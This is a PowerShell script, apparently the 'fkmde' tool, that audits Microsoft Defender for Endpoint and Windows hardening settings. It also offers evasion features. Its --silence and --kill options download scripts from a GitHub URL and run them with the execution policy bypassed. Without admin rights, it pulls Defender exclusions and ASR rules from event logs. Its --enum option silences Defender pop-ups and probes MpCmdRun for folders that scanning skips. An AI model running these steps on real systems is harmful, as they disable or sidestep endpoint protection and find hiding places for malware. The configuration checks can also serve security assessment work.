param (
    [string]$Action,
    [string]$Directory = "C:\Windows",  # Default path for --enum
    [int]$Depth = 1  # Default depth if not provided
)

$banner = @'

      _____         _____         _____         _____         _____
    .'     '.     .'     '.     .'     '.     .'     '.     .'     '.
   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \
  |           | |           | |           | |           | |           |
  |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |
   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /
    '._____.'     '._____.'     '._____.'     '._____.'     '._____.'       

   fkmde by @fkxdr
   https://github.com/fkxdr/fkmde

   
'@

Write-Host $banner -ForegroundColor DarkGray

if (-not $Action) {
      Write-Host "Checking device configuration..."
      Write-Host ""
      
      # Review if command is run as admin
      function IsAdmin {
          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
          return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
      }
      
      # Get Windows Defender Real-Time Protection status
      $DefenderPreferences = Get-MpPreference
      $DefenderStatus = Get-MpComputerStatus
      Write-Host "Antivirus Engine Version :                                    $($DefenderStatus.AMEngineVersion )" -ForegroundColor Green
      Write-Host "Antivirus Product Version :                                   $($DefenderStatus.AMProductVersion)" -ForegroundColor Green
      
      # AMRunningMode Status
      $AMRunningMode = $DefenderStatus.AMRunningMode
      if ($AMRunningMode -eq "Normal" -or $AMRunningMode -eq "EDR Blocked") {
          Write-Host "Antivirus Active Mode :                                       [OK] Enabled" -ForegroundColor Green
      } elseif ($AMRunningMode -eq "Passive" -or $AMRunningMode -eq "SxS Passive Mode") {
          Write-Host "Antivirus Active Mode :                                       [KO] $AMRunningMode" -ForegroundColor DarkRed
      } else {
          Write-Host "Antivirus Active Mode :                                       [??] Unknown - $AMRunningMode" -ForegroundColor DarkYellow
      }

      # Check Language Mode
      Write-Host ""
      $languageMode = $ExecutionContext.SessionState.LanguageMode
      if ($languageMode -eq "FullLanguage") {
          Write-Host "Powershell Constrained Language :                             [KO] Full Language" -ForegroundColor DarkRed
      } elseif ($languageMode -eq "ConstrainedLanguage") {
          Write-Host "Powershell Constrained Language :                             [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Powershell Constrained Language :                             [??] $languageMode" -ForegroundColor DarkYellow
      }
      
      # Check Execution Policy
      $executionPolicy = Get-ExecutionPolicy -Scope CurrentUser
      if ($executionPolicy -eq "RemoteSigned" -or $executionPolicy -eq "Unrestricted") {
          Write-Host "Powershell Execution Policy :                                 [KO] $executionPolicy" -ForegroundColor DarkRed
      } elseif ($executionPolicy -eq "Restricted") {
          Write-Host "Powershell Execution Policy :                                 [OK] Restricted" -ForegroundColor Green
      } else {
          Write-Host "Powershell Execution Policy :                                 [??] $executionPolicy" -ForegroundColor DarkYellow
      }

      # Real-Time Protection Settings
      Write-Host ""
      try {
          if ($defenderStatus.RealTimeProtectionEnabled -eq $true) {
              Write-Host "Real-Time Protection :                                        [OK] Enabled" -ForegroundColor Green
          } else {
              Write-Host "Real-Time Protection :                                        [KO] $($DefenderStatus.RealTimeProtectionEnabled)" -ForegroundColor DarkRed
              $RealTimeProtectionDisabled = $true
          }
      } catch [System.Exception] {
          Write-Host "Real-Time Protection :                                        [??] The status is unknown." -ForegroundColor DarkYellow
          $RealTimeProtectionDisabled = $true
      }

      # MDE Sensor status
      try {
          $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
          $MDEstatus = $MDEservice.Status
      
          if ($MDEstatus -eq "Running") {
              Write-Host "Microsoft Defender for Endpoint Sensor :                      [OK] Enabled" -ForegroundColor Green
          } elseif ($MDEstatus -eq "Stopped") {
              Write-Host "Microsoft Defender for Endpoint Sensor :                      [KO] Disabled" -ForegroundColor DarkRed
              $MDENotRunning = $true
          }
      } catch {
          Write-Host "Microsoft Defender for Endpoint Sensor :                      [??] No Sense found" -ForegroundColor DarkYellow
          $MDENotRunning = $true
      }
      
      # MDE Network Protection status
      try {
          $NetworkProtectionValue = (Get-MpPreference).EnableNetworkProtection
          
          if ($NetworkProtectionValue -eq 1) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [OK] Enabled" -ForegroundColor Green
          } elseif ($NetworkProtectionValue -eq 0) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [KO] Disabled" -ForegroundColor DarkRed
              $NPDisabled = $true
          } elseif ($NetworkProtectionValue -eq 2) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [OK] Audit" -ForegroundColor Green
          }
      } catch [System.Exception] {
          Write-Host "Microsoft Defender for Endpoint Network Protection :          [??] The status is unknown" -ForegroundColor DarkYellow
          $NPDisabled = $true
      }
      
      # Microsoft Edge SmartScreen policy settings
      $edgeSSvalue = $null
      $policyPaths = @(
          "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
          "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
      )
      foreach ($path in $policyPaths) {
          if (Test-Path $path) {
              try {
                  $edgeSSvalue = Get-ItemPropertyValue -Path $path -Name "SmartScreenEnabled" -ErrorAction Stop
                  break
              } catch {}
          }
      }
      if ($edgeSSvalue -eq 0) {
          Write-Host "Microsoft Edge SmartScreen :                                  [KO] Disabled" -ForegroundColor DarkRed
      } else {
          Write-Host "Microsoft Edge SmartScreen :                                  [OK] Enabled" -ForegroundColor Green
      }
      
      # Tamper Protection status
      $TamperProtectionStatus = $DefenderStatus.IsTamperProtected
      $TamperProtectionManage = $DefenderStatus.TamperProtectionSource
      
      # Confirm if Tamper Protection is enabled or disabled
      if ($TamperProtectionStatus -eq $true) {
          Write-Host "Tamper Protection Status :                                    [OK] Enabled" -ForegroundColor Green
      } elseif ($TamperProtectionStatus -eq $false) {
          Write-Host "Tamper Protection Status :                                    [KO] Disabled" -ForegroundColor DarkYellow
      } else {
          Write-Host "Tamper Protection Status :                                    [??] Unknown - $tpStatus"  -ForegroundColor DarkYellow
      }
      
      # Confirm if Tamper Protection is managed by Microsoft or other
      if ($TamperProtectionManage -eq "Intune") {
          Write-Host "Tamper Protection Source :                                    [OK] Intune" -ForegroundColor Green
      } elseif ($TamperProtectionManage -eq "ATP") {
          Write-Host "Tamper Protection Source :                                    [OK] MDE Tenant" -ForegroundColor Green
      } elseif ($TamperProtectionManage -eq "UI") {
          Write-Host "Tamper Protection Source :                                    [KO] Manual via UI" -ForegroundColor DarkRed
      } else {
          Write-Host "Tamper Protection Source :                                    [??] Unknown - $TamperProtectionManage"  -ForegroundColor DarkYellow
      }
      
      # Checking IOAV Protection
      if (-not $DefenderPreferences.DisableIOAVProtection) {
          Write-Host "IOAV Protection :                                             [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "IOAV Protection :                                             [KO] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Email Scanning
      if (-not $DefenderPreferences.DisableEmailScanning) {
          Write-Host "Email Scanning :                                              [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Email Scanning :                                              [KO] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Realtime Monitoring
      if (-not $DefenderPreferences.DisableRealtimeMonitoring) {
          Write-Host "Realtime Monitoring :                                         [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Realtime Monitoring :                                         [??] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Behavior Monitoring
      if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
          Write-Host "Behavior Monitoring :                                         [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Behavior Monitoring :                                         [??] Disabled" -ForegroundColor DarkRed
      }

      # Check Memory Integrity
      try {
          if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
              $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
              if ($hvciStatus -eq 1) {
                  Write-Host "Memory Integrity :                                            [OK] Enabled" -ForegroundColor Green
              } else {
                  Write-Host "Memory Integrity :                                            [KO] Disabled" -ForegroundColor DarkRed
              }
          } else {
              Write-Host "Memory Integrity :                                            [??] Missing Permissions" -ForegroundColor DarkYellow
          }
      } catch {
          Write-Host "Memory Integrity :                                            [??] Other" -ForegroundColor DarkYellow
      }

      # Check Bitlocker
      $bitlockerStatus = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')
      if ($bitlockerStatus -eq 1) {
          Write-Host "Bitlocker Encrypted C Drive :                                 [OK] Enabled" -ForegroundColor Green
      } elseif ($bitlockerStatus -eq 2) {
          Write-Host "Bitlocker Encrypted C Drive :                                 [KO] Disabled" -ForegroundColor DarkRed
      } elseif ($bitlockerStatus -eq 3) {
          Write-Host "Bitlocker Encrypted C Drive :                                 [KO] Encryption in Progress" -ForegroundColor DarkRed
      } else {
          Write-Host "Bitlocker Encrypted C Drive :                                 [??] Other" -ForegroundColor DarkYellow
      }

      # Check WDAC (Windows Defender Application Control) Policy
      try {
          $cipolicies = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
          $codeIntegrityStatus = $cipolicies.CodeIntegrityPolicyEnforcementStatus
          $userModeStatus = $cipolicies.UsermodeCodeIntegrityPolicyEnforcementStatus

          # 0 = Off, 1 = Audit, 2 = Enforced
          $ciLabel = switch ($codeIntegrityStatus) { 0 { "[KO] Off" } 1 { "[??] Audit Mode" } 2 { "[OK] Enforced" } Default { "[??] Unknown ($codeIntegrityStatus)" } }
          $ciColor = switch ($codeIntegrityStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
          Write-Host "WDAC Kernel Mode (CI) :                                       $ciLabel" -ForegroundColor $ciColor

          $umciLabel = switch ($userModeStatus) { 0 { "[KO] Off" } 1 { "[??] Audit Mode" } 2 { "[OK] Enforced" } Default { "[??] Unknown ($userModeStatus)" } }
          $umciColor = switch ($userModeStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
          Write-Host "WDAC User Mode (UMCI) :                                       $umciLabel" -ForegroundColor $umciColor

          # Check for active WDAC policies (multiple policies support since Win10 1903)
          $policyDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
          if (Test-Path $policyDir) {
              $activePolicies = Get-ChildItem -Path $policyDir -Filter "*.cip" -ErrorAction SilentlyContinue
              if ($activePolicies.Count -gt 0) {
                  Write-Host "WDAC Active Policies :                                        [OK] $($activePolicies.Count) policy file(s) deployed" -ForegroundColor Green
                  foreach ($pol in $activePolicies) {
                      Write-Host "  - $($pol.Name) ($([math]::Round($pol.Length / 1KB, 1)) KB)"
                  }
              } else {
                  Write-Host "WDAC Active Policies :                                        [KO] No .cip policy files found" -ForegroundColor DarkRed
              }
          } else {
              Write-Host "WDAC Active Policies :                                        [KO] Policy directory missing" -ForegroundColor DarkRed
          }

          # Check for legacy SIPolicy.p7b (single policy format)
          $legacyPolicy = "$env:windir\System32\CodeIntegrity\SIPolicy.p7b"
          if (Test-Path $legacyPolicy) {
              Write-Host "WDAC Legacy Policy (SIPolicy.p7b) :                           [OK] Present" -ForegroundColor Green
          }
      } catch {
          Write-Host "WDAC Policy :                                                 [??] Unable to query DeviceGuard WMI" -ForegroundColor DarkYellow
      }

      # Check for supplemental WDAC policy files that may weaken base policy
      $supplementalDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
      if (Test-Path $supplementalDir) {
          $sipFiles = Get-ChildItem -Path $supplementalDir -Filter "*.cip" -ErrorAction SilentlyContinue
          if ($sipFiles.Count -gt 1) {
              Write-Host "WDAC Supplemental Policies :                                  [??] $($sipFiles.Count - 1) supplemental policy file(s) - review for weakening rules" -ForegroundColor DarkYellow
          }
      }

      # Check AppLocker Policy
      try {
          $applockerService = Get-Service -Name "AppIDSvc" -ErrorAction Stop
          if ($applockerService.Status -eq "Running") {
              Write-Host "AppLocker Service (AppIDSvc) :                                [OK] Running" -ForegroundColor Green
          } else {
              Write-Host "AppLocker Service (AppIDSvc) :                                [KO] $($applockerService.Status)" -ForegroundColor DarkRed
          }
      } catch {
          Write-Host "AppLocker Service (AppIDSvc) :                                [KO] Not found / installed" -ForegroundColor DarkRed
      }

      # Enumerate AppLocker rules from registry (works without admin for GPO-deployed policies)
      $applockerRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
      $applockerCollections = @("Exe", "Msi", "Script", "Dll", "Appx")
      $applockerConfigured = $false

      foreach ($collection in $applockerCollections) {
          $collPath = "$applockerRegPath\$collection"
          if (Test-Path $collPath) {
              $rules = Get-ChildItem -Path $collPath -ErrorAction SilentlyContinue
              $ruleCount = $rules.Count
              # Check enforcement mode: 0 = Audit, 1 = Enforce
              try {
                  $enforcement = (Get-ItemProperty -Path $collPath -Name "EnforcementMode" -ErrorAction Stop).EnforcementMode
                  $enfLabel = if ($enforcement -eq 1) { "Enforce" } elseif ($enforcement -eq 0) { "Audit" } else { "Unknown" }
              } catch {
                  $enfLabel = "NotConfigured"
              }

              if ($ruleCount -gt 0) {
                  $applockerConfigured = $true
                  $color = if ($enfLabel -eq "Enforce") { "Green" } elseif ($enfLabel -eq "Audit") { "DarkYellow" } else { "DarkRed" }
                  Write-Host "AppLocker $($collection.PadRight(6)) Rules :                                    [$enfLabel] $ruleCount rule(s)" -ForegroundColor $color
              }
          }
      }

      if (-not $applockerConfigured) {
          Write-Host "AppLocker Rules :                                             [KO] No rules configured" -ForegroundColor DarkRed
      }

      # Check for AppLocker default allow rules (weak config indicator)
      if ($applockerConfigured) {
          $exePath = "$applockerRegPath\Exe"
          if (Test-Path $exePath) {
              $exeRules = Get-ChildItem -Path $exePath -ErrorAction SilentlyContinue
              foreach ($rule in $exeRules) {
                  try {
                      $ruleValue = (Get-ItemProperty -Path $rule.PSPath -Name "Value" -ErrorAction Stop).Value
                      if ($ruleValue -match "Action=`"Allow`"" -and $ruleValue -match "Everyone" -and $ruleValue -match "\*") {
                          Write-Host "AppLocker Default Allow-All :                                  [KO] Exe collection has wildcard allow for Everyone" -ForegroundColor DarkRed
                          break
                      }
                  } catch {}
              }
          }
      }

      Write-Host ""

      # Check Defender UI Accessibility
      try {
      $defenderUIEnabled = Test-Path "C:\\Program Files\\Windows Defender\\EppManifest.dll"
      if ($defenderUIEnabled) {
          Write-Host "Microsoft Defender UI :                                       [KO] Accessible" -ForegroundColor DarkRed
      } else {
          Write-Host "Microsoft Defender UI :                                       [OK] Disabled" -ForegroundColor Green
      }
      } catch {
          Write-Host "Microsoft Defender UI :                                       [??] Unable to Determine" -ForegroundColor DarkYellow
      }

      # Check Microsoft Defender Exclusions
      Write-Host ""
      function Check-Exclusions {
          param ($exclusions)
          if ($exclusions -eq $exclusions -like "*N/A: Must be an administrator to view exclusions*") {
              return "[ERROR] No permissions to view exclusions"
          } elseif ($exclusions.Count -eq 0) {
              return "[OK] No exclusions were found"
          } else {
              return "[NG] Exclusions were found"
          }
      }
      
      # Checking Exclusion Extensions when Admin
      if (IsAdmin) {
          # Exclusion Extensions
          $exclusionExtensions = $DefenderPreferences.ExclusionExtension
          if ($exclusionExtensions -eq $null -or $exclusionExtensions.Count -eq 0) {
              Write-Host "Exclusion Extensions :                                        [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Extensions :                                        [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($extension in $exclusionExtensions) {
                  Write-Host "  - $extension"
              }
          }
          
          # Exclusion Paths
          $exclusionPaths = $DefenderPreferences.ExclusionPath
          if ($exclusionPaths -eq $null -or $exclusionPaths.Count -eq 0) {
              Write-Host "Exclusion Paths :                                             [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Paths :                                             [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($path in $exclusionPaths) {
                  Write-Host "  - $path"
              }
          }
      
          # Exclusion Processes
          $exclusionProcesses = $DefenderPreferences.ExclusionProcess
          if ($exclusionProcesses -eq $null -or $exclusionProcesses.Count -eq 0) {
              Write-Host "Exclusion Processes :                                         [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Processes :                                         [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($process in $exclusionProcesses) {
                  Write-Host "  - $process"
              }
          }
      }
      
      
      # Bypass locked Exclusions by checking in Windows Events 5007 if not Admin
      if (-not (IsAdmin)) {
          Write-Host "Missing permissions. Use --enum for MpCmdRun.exe bypass. Checking EventID 5007 for bypass ..."
          $LogName = "Microsoft-Windows-Windows Defender/Operational"
          $EventID = 5007
          $Pattern = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\([^`"]+)"
          $foundExclusions = $false
          $ExclusionEvents = Get-WinEvent -LogName $LogName | Where-Object { $_.Id -eq $EventID -and $_.Message -match "Exclusions" }
          
          foreach ($Event in $ExclusionEvents) {
              if ($Event.Message -match $Pattern) {
                  Write-Host "  - $($Matches[1])"
                  $foundExclusions = $true
              }
          }
          if (-not $foundExclusions) {
              Write-Host "Bypassed Exclusions:                                          [OK] No exclusions were found" -ForegroundColor Green
          }
       }   
      
      # Check ASR rules status
      $asrRulesDefinitions = @{
          "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail :     ";
          "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block all Office applications from creating child processes :";
          "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content : ";
          "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office apps from injecting code into processes :       ";
          "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JS or VBS from running downloaded executable content : ";
          "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts :          ";
          "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros :                   ";
          "01443614-cd74-433a-b99e-2ecdc07bfc25" = "Block executable files unless they meet prevalence or age :  ";
          "c1db55ab-c21a-4637-bb3f-a12568109d35" = "Use advanced protection against ransomware :                 ";
          "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" = "Block credential stealing from lsass.exe :                   ";
          "d1e49aac-8f56-4280-b9ba-993a6d77406c" = "Block process creations from PSExec and WMI commands :       ";
          "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4" = "Block untrusted and unsigned processes that run from USB :   ";
          "26190899-1602-49e8-8b27-eb1d0a1ce869" = "Block Office application from creating child processes :     ";
          "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c" = "Block Adobe Reader from creating child processes :           ";
          "e6db77e5-3df2-4cf1-b95a-636979351e5b" = "Block persistence through WMI event subscription :           ";
          "56a863a9-875e-4185-98a7-b882c64b5ce5" = "Block abuse of exploited vulnerable signed drivers :         ";
          "33ddedf1-c6e0-47cb-833e-de6133960387" = "Block rebooting machine in Safe Mode (preview) :             ";
          "c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb" = "Block use of copied or impersonated system tools (preview) : ";
          "a8f5898e-1dc8-49a9-9878-85004b8a61e6" = "Block Webshell creation for Servers :                        ";
      }
      
      Write-Host ""
      if (IsAdmin) {
          $asrStatuses = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
          $asrRuleGuids = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
      
          for ($i = 0; $i -lt $asrRuleGuids.Count; $i++) {
              $ruleName = $asrRulesDefinitions[$asrRuleGuids[$i]]
              $statusDescription = switch ($asrStatuses[$i]) {
                  0 { "[KO] Disabled" }
                  1 { "[OK] Enabled" }
                  2 { "[??] Audit" }
                  Default { "Unknown" }
              }
              $color = switch ($asrStatuses[$i]) {
                  1 { "Green" }
                  2 { "DarkYellow" }
                  Default { "DarkRed" }
              }
              if ($ruleName) {
                  Write-Host "$ruleName $statusDescription" -ForegroundColor $color
              } else {
                  Write-Host "ASR Rules :                                                   [KO] Disabled" -ForegroundColor $color
              }
          }
      } 
      # Check ASR rules exclusions
      if (IsAdmin) {
          $asrExclusionEntries = @()
          for ($i = 0; $i -lt $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions.Count; $i++) {
              $asrExclusionEntries += [PSCustomObject]@{
                  RuleID = $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions_Id[$i]
                  ExclusionPaths = $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions[$i]
              }
          }
      
          if ($asrExclusionEntries.Count -gt 0) {
              foreach ($entry in $asrExclusionEntries) {
                  $ruleName = $asrRulesDefinitions[$entry.RuleID]
                  if ($entry.ExclusionPaths) {
                      Write-Host "`n$ruleName [KO] Exclusions found" -ForegroundColor DarkRed
                      $paths = $entry.ExclusionPaths -split '\|'
                      foreach ($path in $paths) {
                          Write-Host "  - $path"
                      }
                  }
              }
          } else {
              Write-Host "ASR Exclusions:                                               [OK] No exclusions were found" -ForegroundColor Green
          }
      } 
      
      # Attempting to bypass ASR rules 
      if (-not (IsAdmin)) {
          Write-Host "Missing permissions. Attempting to extract ASR rules through EventID 1121 for bypass ..."
          $LogName = "Microsoft-Windows-Windows Defender/Operational"
          $EventID = 1121
          $displayedRules = @{}
      
          try {
              $ASREvents = Get-WinEvent -LogName $LogName -FilterXPath "*[System[EventID=$EventID]]" -ErrorAction Stop
              if ($ASREvents) {
                  foreach ($event in $ASREvents) {
                      if ($event.Message -match 'ID: ([\w\-]+)') {
                          $asrID = $matches[1]
                          $ruleName = $asrRulesDefinitions[$asrID]
                          if ($ruleName -and -not $displayedRules[$ruleName]) {
                              Write-Host "$ruleName [OK] Enabled" -ForegroundColor Green
                              $displayedRules[$ruleName] = $true
                          }
                      }
                  }
              } else {
                  Write-Host "ASR Rules Bypass:                                             [OK] No ASR rules were found" -ForegroundColor Green
              }
          } catch {
              Write-Host "ASR Rules Bypass:                                             [OK] No ASR rules were found" -ForegroundColor Green
          }
      }
      
      Write-Host ""
      Write-Host "CU soon. Press enter to continue." -ForegroundColor DarkGray
      Read-Host
      exit
}
      
# Function to execute external scripts in /additional repo
function Run-ScriptFromURL {
    param (
        [string]$url,
        [string]$DirectoryPath,
        [int]$ScanDepth
    )
    try {
        $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
        $scriptBlock = [scriptblock]::Create($scriptContent)
        & $scriptBlock -Directory $DirectoryPath -Depth $ScanDepth
    }
    catch {
        Write-Host "Failed to download or run the script from $url"
    }
}

# Function to Toggle DefenderPopup
function Toggle-DefenderPopup {
    param (
        [switch]$Disable
    )
    $keyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter"
    if ($Disable) {
        Reg.exe add $keyPath /v "Enabled" /t REG_DWORD /d "0" /f | Out-Null
    } else {
        Reg.exe delete $keyPath /v "Enabled" /f | Out-Null
    }
}

# Handle the different options
switch ($Action) {
    '--silence' {
        Write-Host "Executing silence script..."
        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/silence.ps1"
    }
    '--kill' {
        if ($Directory -ne $null -and $Directory -ne "") {
            if (-Not (Test-Path -Path $Directory -PathType Container)) {
                Write-Host "Error: Directory '$Directory' not found." -ForegroundColor DarkRed
                return
            }
            Write-Host "Downloading and executing kill script in directory: $Directory..."
            $destination = Join-Path -Path $Directory -ChildPath "kill.ps1"
            try {
                Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1" -OutFile $destination -UseBasicParsing
                Write-Host "Executing kill.ps1 from $destination..."
                
                # Execute in the same process to preserve privileges
                powershell -NoProfile -ExecutionPolicy Bypass -File $destination
            } catch {
                Write-Host "Failed to download or execute kill.ps1: $_" -ForegroundColor DarkRed
            }
        } else {
            Write-Host "Executing kill script from the current directory..."
            Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1"
        }
    }
        '--enum' {
        # Path to MpCmdRun.exe
        $MpPath = "C:\Program Files\Windows Defender\MpCmdRun.exe"

        if (-Not (Test-Path -Path $MpPath)) {
            Write-Host "Error: MpCmdRun.exe not found at $MpPath"
            return
        }
        if (-Not (Test-Path -Path $Directory -PathType Container)) {
            Write-Host "Error: Directory '$Directory' not found."
            return
        }

        Toggle-DefenderPopup -Disable
        try {
            $folders = Get-ChildItem -Path $Directory -Recurse -Directory -Depth ($Depth - 1) -ErrorAction SilentlyContinue | Sort-Object FullName
            Write-Host "Found $($folders.Count) folders in $Directory within a depth of $Depth."
    
            if ($folders.Count -eq 0) {
                Write-Host "No folders found."
                Toggle-DefenderPopup
                return
            }
            $processedFolders = 0
            $totalFolders = $folders.Count
            $progressBarWidth = 50  # Width of the loading bar
            foreach ($folder in $folders) {
                $folderPath = $folder.FullName
                $output = & $MpPath -Scan -ScanType 3 -File "$folderPath\|*" 2>&1
                $processedFolders++
                $percentage = ($processedFolders / $totalFolders) * 100
                $blocks = [int]($processedFolders / $totalFolders * $progressBarWidth)
                $loadingBar = ('#' * $blocks) + ('-' * ($progressBarWidth - $blocks))
                Write-Host -NoNewline "`r[$loadingBar] $processedFolders of $totalFolders folders scanned ($([math]::Round($percentage, 2))%) "

                if ($output -match "was skipped") {
                    Write-Host "`n                                                     [KO] $folderPath" -ForegroundColor DarkRed
                }
            }

            Write-Host "`r[$loadingBar] $processedFolders of $totalFolders folders scanned ($([math]::Round($percentage, 2))%)"

        }
        catch {
            Write-Host "`nError occurred during folder enumeration or scan: $_"
        }

        Toggle-DefenderPopup
    }

    default {
        Write-Host "Invalid argument. Use --kill, --silence or --enum <path> [depth]."
    }
}
